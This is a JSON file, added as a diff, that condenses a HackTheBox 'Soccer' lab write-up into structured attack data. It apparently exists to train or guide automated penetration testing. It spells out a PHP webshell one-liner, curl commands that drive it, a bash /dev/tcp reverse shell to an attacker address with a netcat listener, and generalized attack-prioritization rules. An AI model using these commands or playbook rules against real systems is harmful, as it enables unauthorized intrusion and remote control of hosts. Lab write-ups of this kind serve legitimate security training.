@@ -1,0 +1,986 @@
+{
+  "writeup_id": "Htb_Soccer",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_file_manager_websocket_sqli",
+    "primary_services": [
+      "ssh",
+      "http",
+      "nginx"
+    ],
+    "port_signature": "22+80+9091",
+    "service_combination": "ssh+nginx+custom_http",
+    "os_family": "linux_ubuntu",
+    "environment_type": "web_application",
+    "entry_vector": "file_manager_default_credentials",
+    "privilege_path": "webshell_to_websocket_sqli_to_doas_exploit",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "tiny_file_manager_default_creds",
+      "websocket_sql_injection",
+      "doas_dstat_privilege_escalation",
+      "virtual_host_enumeration"
+    ],
+    "environmental_clues": [
+      "nginx_ubuntu_20.04",
+      "custom_port_9091_http",
+      "host_based_routing",
+      "static_website_frontend"
+    ],
+    "similar_scenarios": [
+      "file_upload_webshell_scenarios",
+      "websocket_exploitation_boxes"
+    ],
+    "unique_aspects": [
+      "websocket_based_sqli",
+      "dstat_plugin_exploitation",
+      "multi_stage_virtual_host_discovery"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Default Credentials",
+        "success_reason": "Tiny File Manager using default admin/admin@123 credentials",
+        "prerequisite_indicators": [
+          "web_application_identified",
+          "login_form_present",
+          "no_custom_configuration"
+        ],
+        "recognition_patterns": [
+          "Tiny File Manager login page",
+          "CCP Programmers branding",
+          "PHP file manager interface"
+        ],
+        "failure_modes": [
+          "credentials_changed_from_default",
+          "account_lockout_enabled",
+          "custom_authentication_implemented"
+        ],
+        "environmental_factors": [
+          "default_installation",
+          "insufficient_hardening",
+          "development_environment"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "File Upload via Web Shell",
+        "success_reason": "Authenticated file manager allows PHP file uploads",
+        "prerequisite_indicators": [
+          "file_manager_access",
+          "php_execution_enabled",
+          "upload_functionality_available"
+        ],
+        "recognition_patterns": [
+          "upload button present",
+          "PHP files allowed",
+          "web accessible upload directory"
+        ],
+        "failure_modes": [
+          "file_extension_filtering",
+          "php_execution_disabled",
+          "upload_directory_not_web_accessible"
+        ],
+        "environmental_factors": [
+          "permissive_upload_policies",
+          "nginx_php_configuration",
+          "writable_web_directories"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "5-10 minutes"
+      },
+      {
+        "technique": "Directory Enumeration",
+        "success_reason": "Standard wordlists revealed /tiny directory",
+        "prerequisite_indicators": [
+          "web_server_responding",
+          "directory_listing_disabled",
+          "common_paths_exist"
+        ],
+        "recognition_patterns": [
+          "301 redirects to directories",
+          "different response codes",
+          "hidden application paths"
+        ],
+        "failure_modes": [
+          "custom_directory_structure",
+          "aggressive_rate_limiting",
+          "waf_blocking_enumeration"
+        ],
+        "environmental_factors": [
+          "standard_web_application_deployment",
+          "predictable_directory_naming",
+          "insufficient_path_obfuscation"
+        ],
+        "success_probability": 0.8,
+        "typical_timeframe": "3-8 minutes"
+      },
+      {
+        "technique": "WebSocket SQL Injection",
+        "success_reason": "Websocket endpoint vulnerable to blind SQL injection",
+        "prerequisite_indicators": [
+          "websocket_endpoint_identified",
+          "user_input_processed",
+          "database_backend_present"
+        ],
+        "recognition_patterns": [
+          "websocket connections in browser dev tools",
+          "JSON message format",
+          "database error responses"
+        ],
+        "failure_modes": [
+          "input_sanitization_implemented",
+          "parameterized_queries_used",
+          "websocket_authentication_required"
+        ],
+        "environmental_factors": [
+          "modern_web_application_features",
+          "insufficient_input_validation",
+          "direct_database_queries"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "doas Privilege Escalation",
+        "success_reason": "User allowed to run dstat as root with custom plugin",
+        "prerequisite_indicators": [
+          "doas_configuration_present",
+          "dstat_allowed_commands",
+          "plugin_directory_writable"
+        ],
+        "recognition_patterns": [
+          "doas.conf allows dstat",
+          "dstat --list shows plugins",
+          "python plugin architecture"
+        ],
+        "failure_modes": [
+          "restricted_plugin_paths",
+          "dstat_not_in_doas_config",
+          "plugin_directory_not_writable"
+        ],
+        "environmental_factors": [
+          "openbsd_style_privilege_escalation",
+          "python_based_tools",
+          "flexible_plugin_systems"
+        ],
+        "success_probability": 0.7,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Tiny File Manager with default credentials",
+        "discovery_method": "Directory enumeration + credential testing",
+        "why_critical": "Provided authenticated file upload leading to web shell",
+        "how_to_recognize": [
+          "CCP Programmers branding",
+          "tinyfilemanager.php endpoint",
+          "standard login interface"
+        ],
+        "follow_up_actions": [
+          "test_default_credentials",
+          "upload_php_webshell",
+          "establish_reverse_shell"
+        ]
+      },
+      {
+        "discovery": "Second virtual host with websocket functionality",
+        "discovery_method": "Post-compromise enumeration of nginx config",
+        "why_critical": "Contained SQL injection vulnerability for lateral movement",
+        "how_to_recognize": [
+          "nginx vhost configurations",
+          "websocket upgrade headers",
+          "different application on same server"
+        ],
+        "follow_up_actions": [
+          "add_vhost_to_hosts_file",
+          "analyze_websocket_traffic",
+          "test_sql_injection_payloads"
+        ]
+      },
+      {
+        "discovery": "doas configuration allowing dstat",
+        "discovery_method": "Privilege escalation enumeration",
+        "why_critical": "dstat plugin system allows arbitrary code execution as root",
+        "how_to_recognize": [
+          "doas.conf file present",
+          "dstat command allowed",
+          "python plugin architecture"
+        ],
+        "follow_up_actions": [
+          "create_malicious_plugin",
+          "execute_dstat_with_plugin",
+          "achieve_root_shell"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated",
+        "escalation_method": "default_credentials_to_file_upload",
+        "why_possible": "File manager installed with default credentials and upload functionality",
+        "recognition_signs": [
+          "file_manager_login_page",
+          "default_credential_documentation",
+          "upload_functionality_visible"
+        ],
+        "exploitation_path": "Default Login → File Upload → Web Shell → Reverse Shell"
+      },
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "websocket_sqli_to_user_shell",
+        "why_possible": "Second application vulnerable to SQL injection over websockets",
+        "recognition_signs": [
+          "multiple_vhosts_configured",
+          "websocket_endpoints_present",
+          "database_integration"
+        ],
+        "exploitation_path": "Vhost Discovery → WebSocket SQLi → Password Extraction → SSH Access"
+      },
+      {
+        "privilege_level": "user",
+        "escalation_method": "doas_dstat_plugin_abuse",
+        "why_possible": "doas allows running dstat as root with custom plugin capability",
+        "recognition_signs": [
+          "doas_configuration_present",
+          "dstat_in_allowed_commands",
+          "plugin_system_available"
+        ],
+        "exploitation_path": "doas dstat → Custom Plugin → Root Code Execution"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,9091 open on Linux host with nginx redirect to soccer.htb",
+        "decision": "Enumerate web services and check for virtual hosts",
+        "reasoning": "Host-based routing indicated by redirect, multiple HTTP services suggest web application focus",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web services fail"
+          },
+          {
+            "option": "port_9091_investigation",
+            "when": "if main site is static"
+          }
+        ],
+        "success_indicators": [
+          "virtual_hosts_discovered",
+          "web_applications_identified",
+          "directory_enumeration_results"
+        ],
+        "next_decision": "analyze_web_application_stack"
+      },
+      {
+        "step": 2,
+        "situation": "Directory enumeration reveals /tiny path with file manager",
+        "decision": "Identify application as Tiny File Manager and try default credentials",
+        "reasoning": "File managers often have default credentials and provide direct file upload capabilities",
+        "confidence": 0.95,
+        "prerequisites": [
+          "directory_enumeration_complete",
+          "application_identified"
+        ],
+        "success_indicators": [
+          "authentication_successful",
+          "file_upload_capability_confirmed"
+        ],
+        "failure_fallbacks": [
+          "credential_bruteforce",
+          "application_vulnerability_research"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Authenticated to Tiny File Manager with admin/admin@123",
+        "decision": "Upload PHP webshell to writable directory",
+        "reasoning": "PHP environment confirmed, file manager provides upload capability",
+        "confidence": 0.98,
+        "prerequisites": [
+          "php_environment_confirmed",
+          "upload_directory_writable"
+        ],
+        "success_indicators": [
+          "webshell_uploaded",
+          "command_execution_confirmed"
+        ],
+        "next_decision": "establish_reverse_shell"
+      }
+    ],
+    "branching_logic": {
+      "if_default_credentials_work": {
+        "action": "exploit_file_upload_functionality",
+        "tools": [
+          "webshell",
+          "reverse_shell_payload"
+        ],
+        "next_phase": "establish_persistent_access"
+      },
+      "if_file_upload_restricted": {
+        "action": "find_writable_upload_directory",
+        "alternatives": [
+          "uploads_subdirectory",
+          "temp_directories",
+          "user_directories"
+        ],
+        "decision_criteria": "based_on_directory_permissions"
+      },
+      "if_webshell_successful": {
+        "action": "upgrade_to_reverse_shell",
+        "purpose": "establish_interactive_access",
+        "tools": [
+          "nc",
+          "bash_reverse_shell"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_try_default_credentials_on_file_managers",
+        "reasoning": "high_success_rate_and_immediate_file_access",
+        "applicability": "web_based_file_management_applications"
+      },
+      {
+        "rule": "test_upload_restrictions_in_subdirectories",
+        "reasoning": "main_directory_restrictions_often_dont_apply_to_subdirs",
+        "applicability": "file_upload_functionality_available"
+      },
+      {
+        "rule": "prioritize_php_webshells_on_php_applications",
+        "reasoning": "native_execution_environment_provides_reliable_access",
+        "applicability": "php_web_applications"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Default Credential Access",
+        "mitre_id": "T1078.001",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_detected",
+          "file_manager_interface_present",
+          "login_form_accessible"
+        ],
+        "success_indicators": [
+          "tiny_file_manager_detected",
+          "admin_login_form_present",
+          "default_credentials_accepted"
+        ],
+        "incompatible_with": [
+          "custom_authentication",
+          "sso_integration",
+          "account_lockout_enabled"
+        ],
+        "confidence_boosters": [
+          "tiny_file_manager_title",
+          "default_installation_artifacts",
+          "no_security_hardening_evident"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Web Shell Upload",
+        "mitre_id": "T1505.003",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_functionality",
+          "web_accessible_upload_directory",
+          "script_execution_enabled"
+        ],
+        "success_indicators": [
+          "file_manager_write_access",
+          "php_execution_enabled",
+          "uploaded_file_accessible"
+        ],
+        "incompatible_with": [
+          "file_extension_filtering",
+          "content_type_validation",
+          "upload_directory_not_executable"
+        ],
+        "confidence_boosters": [
+          "php_server_detected",
+          "unrestricted_file_uploads",
+          "web_root_write_access"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "3-10 minutes"
+      },
+      {
+        "technique": "WebSocket SQL Injection",
+        "mitre_id": "T1190",
+        "required_services": [
+          "websocket",
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443,
+          9091
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "websocket_endpoint_detected",
+          "database_backend_present",
+          "user_input_processing"
+        ],
+        "success_indicators": [
+          "websocket_connection_established",
+          "sql_error_messages",
+          "data_extraction_successful"
+        ],
+        "incompatible_with": [
+          "parameterized_queries",
+          "input_sanitization",
+          "websocket_authentication_required"
+        ],
+        "confidence_boosters": [
+          "validation_functionality_present",
+          "database_error_disclosure",
+          "unfiltered_user_input"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "Doas Privilege Escalation",
+        "mitre_id": "T1548.003",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux",
+          "openbsd"
+        ],
+        "environmental_prerequisites": [
+          "doas_binary_present",
+          "user_doas_permissions",
+          "exploitable_command_allowed"
+        ],
+        "success_indicators": [
+          "doas_config_accessible",
+          "dstat_execution_allowed",
+          "plugin_directory_writable"
+        ],
+        "incompatible_with": [
+          "restricted_doas_config",
+          "command_path_restrictions",
+          "plugin_directory_protected"
+        ],
+        "confidence_boosters": [
+          "dstat_with_nopass",
+          "custom_plugin_support",
+          "unrestricted_plugin_path"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443,
+          9091
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "nginx",
+          "apache"
+        ],
+        "banner_indicators": [
+          "nginx",
+          "apache",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "file_manager": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "tiny file manager",
+          "file manager",
+          "upload"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "websocket_service": {
+        "port_indicators": [
+          9091,
+          8080,
+          3000,
+          8443
+        ],
+        "service_indicators": [
+          "websocket",
+          "ws",
+          "wss"
+        ],
+        "banner_indicators": [
+          "websocket",
+          "socket.io"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "openssh"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH"
+        ],
+        "confidence_threshold": 0.95
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "default_credential_access",
+          "when": "file_manager_detected",
+          "reason": "high_success_rate_immediate_access"
+        },
+        {
+          "attack": "web_shell_upload",
+          "when": "file_upload_capability_confirmed",
+          "reason": "direct_code_execution_capability"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "websocket_sql_injection",
+          "when": "websocket_service_detected",
+          "reason": "credential_extraction_potential"
+        },
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "discovery_of_hidden_functionality"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "doas_privilege_escalation",
+          "when": "ssh_access_obtained",
+          "reason": "requires_initial_foothold"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Default Credential Access",
+        "mitre_id": "T1078.001",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST {url} -d 'username={user}&password={pass}'",
+            "actual_command": "Login via web interface with admin/admin@123",
+            "output_pattern": "successful authentication to file manager",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "default_credentials_unchanged",
+          "web_application_accessible",
+          "authentication_enabled"
+        ],
+        "success_indicators": [
+          "successful_login_to_application",
+          "access_to_file_management_interface",
+          "ability_to_upload_files"
+        ],
+        "common_failures": [
+          "credentials_changed_from_default",
+          "authentication_disabled",
+          "ip_restrictions_in_place"
+        ],
+        "follow_up_techniques": [
+          "webshell_upload",
+          "file_system_enumeration",
+          "privilege_escalation"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Webshell Upload",
+        "mitre_id": "T1505.003",
+        "category": "persistence",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "tiny_file_manager",
+            "command_template": "Upload via web interface to writable directory",
+            "actual_command": "Upload cmd.php to /tiny/uploads/",
+            "output_pattern": "file uploaded successfully",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "curl",
+            "command_template": "curl {url} -d 'cmd={command}'",
+            "actual_command": "curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=id'",
+            "output_pattern": "uid=33(www-data) gid=33(www-data)",
+            "effectiveness_rating": 5,
+            "reliability": 0.99
+          }
+        ],
+        "prerequisites": [
+          "file_upload_functionality",
+          "writable_web_directory",
+          "php_execution_enabled"
+        ],
+        "success_indicators": [
+          "webshell_uploaded_successfully",
+          "command_execution_confirmed",
+          "web_accessible_shell_location"
+        ],
+        "common_failures": [
+          "file_extension_restrictions",
+          "upload_directory_not_web_accessible",
+          "insufficient_permissions"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "system_enumeration",
+          "credential_harvesting"
+        ],
+        "time_investment": "3-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Reverse Shell Establishment",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "bash",
+            "command_template": "bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"",
+            "actual_command": "bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"",
+            "output_pattern": "reverse connection established",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "netcat",
+            "command_template": "nc -lnvp {port}",
+            "actual_command": "nc -lnvp 443",
+            "output_pattern": "Connection received from target",
+            "effectiveness_rating": 5,
+            "reliability": 0.99
+          }
+        ],
+        "prerequisites": [
+          "command_execution_capability",
+          "outbound_network_connectivity",
+          "bash_available_on_target"
+        ],
+        "success_indicators": [
+          "interactive_shell_established",
+          "command_execution_confirmed",
+          "persistent_connection_maintained"
+        ],
+        "common_failures": [
+          "outbound_connections_blocked",
+          "shell_not_available",
+          "connection_timeout"
+        ],
+        "follow_up_techniques": [
+          "shell_stabilization",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Directory Enumeration",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "feroxbuster",
+            "command_template": "feroxbuster -u {url}",
+            "actual_command": "feroxbuster -u http://soccer.htb",
+            "output_pattern": "301 GET /tiny => http://soccer.htb/tiny/",
+            "effectiveness_rating": 5,
+            "reliability": 0.92
+          },
+          {
+            "name": "ffuf",
+            "command_template": "ffuf -u {url} -H \"Host: FUZZ.{domain}\" -w {wordlist}",
+            "actual_command": "ffuf -u http://10.10.11.194 -H \"Host: FUZZ.soccer.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt",
+            "output_pattern": "subdomain discovery results",
+            "effectiveness_rating": 4,
+            "reliability": 0.88
+          }
+        ],
+        "prerequisites": [
+          "web_server_accessible",
+          "wordlist_available",
+          "network_connectivity"
+        ],
+        "success_indicators": [
+          "hidden_directories_discovered",
+          "interesting_endpoints_found",
+          "attack_surface_expanded"
+        ],
+        "common_failures": [
+          "rate_limiting_triggered",
+          "waf_blocking_requests",
+          "no_interesting_directories"
+        ],
+        "follow_up_techniques": [
+          "content_analysis",
+          "vulnerability_assessment",
+          "credential_discovery"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "feroxbuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.92,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "gobuster",
+          "dirbuster",
+          "ffuf"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists",
+          "adjust_thread_count_for_target",
+          "enable_recursion_for_thorough_discovery"
+        ]
+      },
+      {
+        "tool": "Tiny File Manager",
+        "use_case": "file_upload_and_management",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "webshell_deployment"
+        ],
+        "alternatives": [
+          "manual_upload_forms",
+          "ftp_access"
+        ],
+        "best_practices": [
+          "check_default_credentials_first",
+          "identify_writable_directories",
+          "test_file_execution_capabilities"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "tiny_file_manager_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "feroxbuster -u http://soccer.htb",
+            "purpose": "Discover hidden directories",
+            "expected_output": "Found /tiny directory"
+          },
+          {
+            "step": 2,
+            "command": "Login with admin/admin@123",
+            "purpose": "Access file manager with default credentials",
+            "expected_output": "Successful authentication"
+          },
+          {
+            "step": 3,
+            "command": "Upload <?php system($_REQUEST[\"cmd\"]); ?> as cmd.php",
+            "purpose": "Deploy webshell to uploads directory",
+            "expected_output": "File uploaded successfully"
+          },
+          {
+            "step": 4,
+            "command": "curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=id'",
+            "purpose": "Test webshell functionality",
+            "expected_output": "uid=33(www-data) gid=33(www-data)"
+          },
+          {
+            "step": 5,
+            "command": "nc -lnvp 443",
+            "purpose": "Setup reverse shell listener",
+            "expected_output": "Listening on port 443"
+          },
+          {
+            "step": 6,
+            "command": "curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"'",
+            "purpose": "Establish reverse shell",
+            "expected_output": "Interactive shell as www-data"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "10-20 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Soccer",
+      "difficulty": "Easy",
+      "os": "Linux Ubuntu 20.04",
+      "platform": "HackTheBox",
+      "release_date": "2022-12-17",
+      "author": "sau123",
+      "estimated_time": "45-75 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "beginner_to_intermediate",
+      "primary_attack_vectors": [
+        "web_exploitation",
+        "websocket_injection",
+        "privilege_escalation"
+      ],
+      "key_vulnerabilities": [
+        "default_credentials",
+        "sql_injection_websocket",
+        "dstat_plugin_abuse"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "websocket_security",
+        "file_manager_exploitation",
+        "doas_privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_exploitation",
+        "sql_injection",
+        "linux_privilege_escalation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "websocket_attacks",
+        "file_upload",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "change_default_credentials",
+        "validate_websocket_input",
+        "restrict_sudo_doas_permissions"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Shoppy",
+        "Precious",
+        "Inject"
+      ],
+      "similarity_reasons": [
+        "web_exploitation_chain",
+        "file_upload_attacks",
+        "modern_web_technologies"
+      ],
+      "unique_aspects": [
+        "websocket_sql_injection",
+        "tiny_file_manager",
+        "dstat_plugin_exploitation"
+      ],
+      "difficulty_factors": [
+        "websocket_attack_vector",
+        "multi_stage_exploitation",
+        "custom_plugin_creation"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-03T23:43:22.955498",
+    "original_file": "0xdf_writeups/Htb Soccer.md",
+    "content_length": 32562,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
